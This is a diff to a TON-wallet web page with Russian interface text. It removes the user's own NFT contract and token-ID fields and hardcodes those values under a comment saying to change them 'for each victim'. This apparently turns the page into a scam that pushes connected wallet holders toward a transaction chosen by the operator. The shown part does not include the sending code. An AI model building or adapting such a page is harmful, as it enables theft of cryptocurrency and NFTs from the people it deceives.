@@ -700,11 +700,9 @@ applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 
 <div id="ton-connect-button" style="margin-top:12px;"></div>
 <p id="ton-status">Кошелёк не подключён</p>
-<input type="text" id="nft-contract" placeholder="Адрес контракта NFT" style="width:100%;padding:8px;margin:4px 0;">
-<input type="text" id="nft-token-id" placeholder="ID токена" style="width:100%;padding:8px;margin:4px 0;">
 
 <script src="https://unpkg.com/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@ton/core@0.0.39/dist/index.min.js"></script>
+<script src="https://unpkg.com/@ton/core@0.0.39/dist/index.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
   if (!window.TON_CONNECT_UI) {
@@ -759,14 +757,9 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
+      // ЖЁСТКО ЗАДАННЫЕ ЗНАЧЕНИЯ (меняй здесь под каждую жертву)
       const contractAddress = 'EQCD39VS5jcwd4aVUY9xgB2bLgXqUAA2u4EgEooD5uS4YQxH';
       const tokenId = '12345';
-
-      if (!contractAddress || !tokenId) {
-        err.textContent = 'Введите адрес контракта и ID токена';
-        err.style.display = 'block';
-        return;
-      }
 
       err.textContent = '⏳ Отправляем запрос...';
       err.style.display = 'block';
